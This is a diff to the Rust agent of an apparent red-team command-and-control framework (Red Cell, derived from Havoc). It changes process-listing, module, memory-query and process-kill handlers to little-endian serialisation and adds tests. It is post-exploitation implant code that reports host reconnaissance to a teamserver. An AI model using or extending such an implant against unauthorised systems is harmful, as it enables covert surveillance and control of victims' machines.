@@ -942,11 +942,11 @@ fn kill_process(pid: u32) -> bool {
 // ─── COMMAND_PROC_LIST (12) ───────────────────────────────────────────────────
 
 /// Handle a `CommandProcList` task: enumerate all running processes and return
-/// the list in the wire format expected by the Havoc teamserver.
+/// the list in the wire format expected by the Red Cell teamserver.
 ///
 /// Incoming payload (LE): `[process_ui: u32]`
 ///
-/// Outgoing payload (BE):
+/// Outgoing payload (LE):
 /// `[process_ui: u32]` then per process:
 /// `[name: utf16le][pid: u32][is_wow64: u32][ppid: u32][session: u32][threads: u32][user: utf16le]`
 fn handle_proc_list(payload: &[u8]) -> DispatchResult {
@@ -954,15 +954,15 @@ fn handle_proc_list(payload: &[u8]) -> DispatchResult {
     let process_ui = parse_u32_le(payload, &mut offset).unwrap_or(0);
     let processes = enum_processes();
     let mut response = Vec::new();
-    write_u32_be(&mut response, process_ui);
+    write_u32_le(&mut response, process_ui);
     for p in &processes {
-        write_utf16le_be(&mut response, &p.name);
-        write_u32_be(&mut response, p.pid);
-        write_u32_be(&mut response, u32::from(p.is_wow64));
-        write_u32_be(&mut response, p.ppid);
-        write_u32_be(&mut response, p.session_id);
-        write_u32_be(&mut response, p.num_threads);
-        write_utf16le_be(&mut response, &p.user);
+        write_utf16le(&mut response, &p.name);
+        write_u32_le(&mut response, p.pid);
+        write_u32_le(&mut response, u32::from(p.is_wow64));
+        write_u32_le(&mut response, p.ppid);
+        write_u32_le(&mut response, p.session_id);
+        write_u32_le(&mut response, p.num_threads);
+        write_utf16le(&mut response, &p.user);
     }
     DispatchResult::Respond(Response::new(DemonCommand::CommandProcList, response))
 }
@@ -973,18 +973,18 @@ fn handle_proc_list(payload: &[u8]) -> DispatchResult {
 ///
 /// Incoming args (LE): `[pid: u32]` (0 = current process)
 ///
-/// Outgoing payload (BE):
+/// Outgoing payload (LE):
 /// `[subcmd: u32][pid: u32]` then per module: `[name: bytes][base_addr: u64]`
 fn handle_proc_modules(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
     let mut offset = 0;
     let pid = parse_u32_le(rest, &mut offset).unwrap_or(0);
     let modules = enum_modules(pid);
     let mut payload = Vec::new();
-    write_u32_be(&mut payload, subcmd_raw);
-    write_u32_be(&mut payload, pid);
+    write_u32_le(&mut payload, subcmd_raw);
+    write_u32_le(&mut payload, pid);
     for m in &modules {
-        write_bytes_be(&mut payload, m.name.as_bytes());
-        write_ptr_be(&mut payload, m.base_addr);
+        write_bytes_le(&mut payload, m.name.as_bytes());
+        write_ptr_le(&mut payload, m.base_addr);
     }
     DispatchResult::Respond(Response::new(DemonCommand::CommandProc, payload))
 }
@@ -995,7 +995,7 @@ fn handle_proc_modules(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
 ///
 /// Incoming args (LE): `[name: bytes (UTF-16LE, length-prefixed)]`
 ///
-/// Outgoing payload (BE):
+/// Outgoing payload (LE):
 /// `[subcmd: u32]` then per match:
 /// `[name: utf16le][pid: u32][ppid: u32][user: utf16le][arch: u32]`
 fn handle_proc_grep(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
@@ -1010,13 +1010,13 @@ fn handle_proc_grep(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
     let name = decode_utf16le_null(&name_bytes);
     let matches = grep_processes(&name);
     let mut payload = Vec::new();
-    write_u32_be(&mut payload, subcmd_raw);
+    write_u32_le(&mut payload, subcmd_raw);
     for m in &matches {
-        write_utf16le_be(&mut payload, &m.name);
-        write_u32_be(&mut payload, m.pid);
-        write_u32_be(&mut payload, m.ppid);
-        write_utf16le_be(&mut payload, &m.user);
-        write_u32_be(&mut payload, m.arch);
+        write_utf16le(&mut payload, &m.name);
+        write_u32_le(&mut payload, m.pid);
+        write_u32_le(&mut payload, m.ppid);
+        write_utf16le(&mut payload, &m.user);
+        write_u32_le(&mut payload, m.arch);
     }
     DispatchResult::Respond(Response::new(DemonCommand::CommandProc, payload))
 }
@@ -1028,7 +1028,7 @@ fn handle_proc_grep(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
 /// Incoming args (LE): `[pid: u32][protection_filter: u32]`
 /// (protection_filter == 0 means return all regions)
 ///
-/// Outgoing payload (BE):
+/// Outgoing payload (LE):
 /// `[subcmd: u32][pid: u32][protection: u32]` then per region:
 /// `[base_addr: u64][region_size: u32][alloc_protect: u32][state: u32][type: u32]`
 fn handle_proc_memory(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
@@ -1043,15 +1043,15 @@ fn handle_proc_memory(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
     let protect_filter = parse_u32_le(rest, &mut offset).unwrap_or(0);
     let regions = query_memory(pid, protect_filter);
     let mut payload = Vec::new();
-    write_u32_be(&mut payload, subcmd_raw);
-    write_u32_be(&mut payload, pid);
-    write_u32_be(&mut payload, protect_filter);
+    write_u32_le(&mut payload, subcmd_raw);
+    write_u32_le(&mut payload, pid);
+    write_u32_le(&mut payload, protect_filter);
     for r in &regions {
-        write_ptr_be(&mut payload, r.base_addr);
-        write_u32_be(&mut payload, r.region_size);
-        write_u32_be(&mut payload, r.alloc_protect);
-        write_u32_be(&mut payload, r.state);
-        write_u32_be(&mut payload, r.mem_type);
+        write_ptr_le(&mut payload, r.base_addr);
+        write_u32_le(&mut payload, r.region_size);
+        write_u32_le(&mut payload, r.alloc_protect);
+        write_u32_le(&mut payload, r.state);
+        write_u32_le(&mut payload, r.mem_type);
     }
     DispatchResult::Respond(Response::new(DemonCommand::CommandProc, payload))
 }
@@ -1062,7 +1062,7 @@ fn handle_proc_memory(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
 ///
 /// Incoming args (LE): `[pid: u32]`
 ///
-/// Outgoing payload (BE): `[subcmd: u32][success: u32][pid: u32]`
+/// Outgoing payload (LE): `[subcmd: u32][success: u32][pid: u32]`
 fn handle_proc_kill(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
     let mut offset = 0;
     let pid = match parse_u32_le(rest, &mut offset) {
@@ -1074,9 +1074,9 @@ fn handle_proc_kill(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
     };
     let success = kill_process(pid);
     let mut payload = Vec::new();
-    write_u32_be(&mut payload, subcmd_raw);
-    write_u32_be(&mut payload, u32::from(success));
-    write_u32_be(&mut payload, pid);
+    write_u32_le(&mut payload, subcmd_raw);
+    write_u32_le(&mut payload, u32::from(success));
+    write_u32_le(&mut payload, pid);
     DispatchResult::Respond(Response::new(DemonCommand::CommandProc, payload))
 }
 
@@ -1112,6 +1112,8 @@ fn decode_utf16le_null(bytes: &[u8]) -> String {
 }
 
 // ─── Payload serialisation helpers (agent → server, big-endian) ──────────────
+//
+// Used by the existing Sleep, Fs, and Exec callbacks which pre-date the LE fix.
 
 /// Append a `u32` in big-endian byte order.
 fn write_u32_be(buf: &mut Vec<u8>, v: u32) {
@@ -1127,8 +1129,7 @@ fn write_bytes_be(buf: &mut Vec<u8>, data: &[u8]) {
 }
 
 /// Append a `u64` pointer in big-endian byte order (8 bytes).
-///
-/// Used for base-address fields; the Go teamserver's `ParsePointer` reads 8 bytes.
+#[allow(dead_code)]
 fn write_ptr_be(buf: &mut Vec<u8>, v: u64) {
     buf.extend_from_slice(&v.to_be_bytes());
 }
@@ -1138,6 +1139,38 @@ fn write_utf16le_be(buf: &mut Vec<u8>, s: &str) {
     let utf16: Vec<u8> =
         s.encode_utf16().chain(std::iter::once(0u16)).flat_map(|c| c.to_le_bytes()).collect();
     write_bytes_be(buf, &utf16);
+}
+
+// ─── Payload serialisation helpers (agent → server, little-endian) ───────────
+//
+// Used by the process callbacks (CommandProcList / CommandProc) whose fields
+// are parsed by the Rust teamserver's `CallbackParser` which reads LE.
+
+/// Append a `u32` in little-endian byte order.
+fn write_u32_le(buf: &mut Vec<u8>, v: u32) {
+    buf.extend_from_slice(&v.to_le_bytes());
+}
+
+/// Append a length-prefixed byte slice: `[u32 LE length][bytes…]`.
+fn write_bytes_le(buf: &mut Vec<u8>, data: &[u8]) {
+    #[allow(clippy::cast_possible_truncation)]
+    let len = data.len() as u32;
+    buf.extend_from_slice(&len.to_le_bytes());
+    buf.extend_from_slice(data);
+}
+
+/// Append a `u64` pointer in little-endian byte order (8 bytes).
+///
+/// Used for base-address fields; the Rust teamserver's `CallbackParser::read_u64` reads 8 bytes LE.
+fn write_ptr_le(buf: &mut Vec<u8>, v: u64) {
+    buf.extend_from_slice(&v.to_le_bytes());
+}
+
+/// Encode `s` as UTF-16LE with a NUL terminator and append `[u32 LE length][bytes…]`.
+fn write_utf16le(buf: &mut Vec<u8>, s: &str) {
+    let utf16: Vec<u8> =
+        s.encode_utf16().chain(std::iter::once(0u16)).flat_map(|c| c.to_le_bytes()).collect();
+    write_bytes_le(buf, &utf16);
 }
 
 // ─── Unit tests ──────────────────────────────────────────────────────────────
@@ -1268,6 +1301,23 @@ mod tests {
         // First 4 bytes: BE length of UTF-16LE bytes (including null terminator)
         // "hello\0" → 6 UTF-16 code units × 2 bytes = 12 bytes
         let len = u32::from_be_bytes(buf[0..4].try_into().expect("len"));
+        assert_eq!(len, 12); // 5 chars + NUL = 6 × 2
+
+        let decoded = decode_utf16le_null(&buf[4..]);
+        assert_eq!(decoded, s);
+    }
+
+    // ── write_utf16le ────────────────────────────────────────────────────────
+
+    #[test]
+    fn write_utf16le_roundtrips_ascii_string() {
+        let s = "hello";
+        let mut buf = Vec::new();
+        write_utf16le(&mut buf, s);
+
+        // First 4 bytes: LE length of UTF-16LE bytes (including null terminator)
+        // "hello\0" → 6 UTF-16 code units × 2 bytes = 12 bytes
+        let len = u32::from_le_bytes(buf[0..4].try_into().expect("len"));
         assert_eq!(len, 12); // 5 chars + NUL = 6 × 2
 
         let decoded = decode_utf16le_null(&buf[4..]);
@@ -1632,6 +1682,15 @@ mod tests {
         assert_eq!(buf, [0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77]);
     }
 
+    // ── write_ptr_le ─────────────────────────────────────────────────────────
+
+    #[test]
+    fn write_ptr_le_encodes_eight_bytes_little_endian() {
+        let mut buf = Vec::new();
+        write_ptr_le(&mut buf, 0x0011_2233_4455_6677);
+        assert_eq!(buf, [0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x00]);
+    }
+
     // ── handle_proc_list ─────────────────────────────────────────────────────
 
     #[test]
@@ -1656,7 +1715,7 @@ mod tests {
         let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
             panic!("expected Respond");
         };
-        let echoed_ui = u32::from_be_bytes(resp.payload[0..4].try_into().expect("be u32"));
+        let echoed_ui = u32::from_le_bytes(resp.payload[0..4].try_into().expect("le u32"));
         assert_eq!(echoed_ui, 1, "process_ui must be echoed verbatim");
     }
 
@@ -1681,32 +1740,32 @@ mod tests {
         let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
             panic!("expected Respond");
         };
-        // Parse the response: skip process_ui (4 bytes), then iterate entries.
+        // Parse the response (LE): skip process_ui (4 bytes), then iterate entries.
         let p = &resp.payload;
         let mut pos = 4usize; // skip process_ui
         let mut found = false;
         while pos + 4 <= p.len() {
-            // name: length-prefixed utf16le
+            // name: length-prefixed utf16le (LE length prefix)
             let name_len =
-                u32::from_be_bytes(p[pos..pos + 4].try_into().expect("name len")) as usize;
+                u32::from_le_bytes(p[pos..pos + 4].try_into().expect("name len")) as usize;
             pos += 4 + name_len;
             if pos + 4 > p.len() {
                 break;
             }
-            // pid
-            let pid = u32::from_be_bytes(p[pos..pos + 4].try_into().expect("pid"));
+            // pid (LE)
+            let pid = u32::from_le_bytes(p[pos..pos + 4].try_into().expect("pid"));
             pos += 4;
             if pid == own_pid {
                 found = true;
             }
             // skip: is_wow64 + ppid + session_id + threads = 4 × u32 = 16 bytes
             pos += 16;
-            // user: length-prefixed utf16le
+            // user: length-prefixed utf16le (LE length prefix)
             if pos + 4 > p.len() {
                 break;
             }
             let user_len =
-                u32::from_be_bytes(p[pos..pos + 4].try_into().expect("user len")) as usize;
+                u32::from_le_bytes(p[pos..pos + 4].try_into().expect("user len")) as usize;
             pos += 4 + user_len;
         }
         assert!(found, "own PID {own_pid} not found in process list");
@@ -1725,8 +1784,8 @@ mod tests {
             panic!("expected Respond");
         };
         assert_eq!(resp.command_id, u32::from(DemonCommand::CommandProc));
-        // First 4 bytes must be subcmd=2
-        let subcmd = u32::from_be_bytes(resp.payload[0..4].try_into().expect("subcmd"));
+        // First 4 bytes must be subcmd=2 (LE)
+        let subcmd = u32::from_le_bytes(resp.payload[0..4].try_into().expect("subcmd"));
         assert_eq!(subcmd, 2);
     }
 
@@ -1739,7 +1798,7 @@ mod tests {
         let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
             panic!("expected Respond");
         };
-        let echoed_pid = u32::from_be_bytes(resp.payload[4..8].try_into().expect("pid"));
+        let echoed_pid = u32::from_le_bytes(resp.payload[4..8].try_into().expect("pid"));
         assert_eq!(echoed_pid, 42);
     }
 
@@ -1755,7 +1814,7 @@ mod tests {
             panic!("expected Respond");
         };
         assert_eq!(resp.command_id, u32::from(DemonCommand::CommandProc));
-        let subcmd = u32::from_be_bytes(resp.payload[0..4].try_into().expect("subcmd"));
+        let subcmd = u32::from_le_bytes(resp.payload[0..4].try_into().expect("subcmd"));
         assert_eq!(subcmd, 3, "subcmd must be echoed as 3 (Grep)");
     }
 
@@ -1795,7 +1854,7 @@ mod tests {
             panic!("expected Respond");
         };
         assert_eq!(resp.command_id, u32::from(DemonCommand::CommandProc));
-        let subcmd = u32::from_be_bytes(resp.payload[0..4].try_into().expect("subcmd"));
+        let subcmd = u32::from_le_bytes(resp.payload[0..4].try_into().expect("subcmd"));
         assert_eq!(subcmd, 6, "subcmd must be echoed as 6 (Memory)");
     }
 
@@ -1809,8 +1868,8 @@ mod tests {
         let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
             panic!("expected Respond");
         };
-        let echoed_pid = u32::from_be_bytes(resp.payload[4..8].try_into().expect("pid"));
-        let echoed_filter = u32::from_be_bytes(resp.payload[8..12].try_into().expect("filter"));
+        let echoed_pid = u32::from_le_bytes(resp.payload[4..8].try_into().expect("pid"));
+        let echoed_filter = u32::from_le_bytes(resp.payload[8..12].try_into().expect("filter"));
         assert_eq!(echoed_pid, 1234);
         assert_eq!(echoed_filter, 0x04);
     }
@@ -1853,9 +1912,9 @@ mod tests {
         let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
             panic!("expected Respond");
         };
-        let subcmd = u32::from_be_bytes(resp.payload[0..4].try_into().expect("subcmd"));
-        let success = u32::from_be_bytes(resp.payload[4..8].try_into().expect("success"));
-        let echoed_pid = u32::from_be_bytes(resp.payload[8..12].try_into().expect("pid"));
+        let subcmd = u32::from_le_bytes(resp.payload[0..4].try_into().expect("subcmd"));
+        let success = u32::from_le_bytes(resp.payload[4..8].try_into().expect("success"));
+        let echoed_pid = u32::from_le_bytes(resp.payload[8..12].try_into().expect("pid"));
         assert_eq!(subcmd, 7, "subcmd must be echoed as 7 (Kill)");
         assert_eq!(success, 0, "kill of bogus pid must report failure");
         assert_eq!(echoed_pid, 9_999_999);
